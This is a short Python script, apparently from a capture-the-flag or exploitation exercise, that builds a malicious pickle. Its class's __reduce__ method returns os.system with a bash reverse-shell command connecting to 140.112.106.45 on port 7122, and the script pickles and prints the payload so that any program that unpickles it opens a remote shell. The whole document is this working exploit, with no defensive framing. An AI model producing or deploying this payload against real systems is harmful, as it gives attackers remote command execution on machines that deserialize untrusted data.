import pickle
import os
class exp(object):
    def __reduce__(self):
        s = "bash -c 'bash -i >& /dev/tcp/140.112.106.45/7122 0>&1'"
        return (os.system, (s,))
    
e = exp()
s = pickle.dumps(e)
print(s)
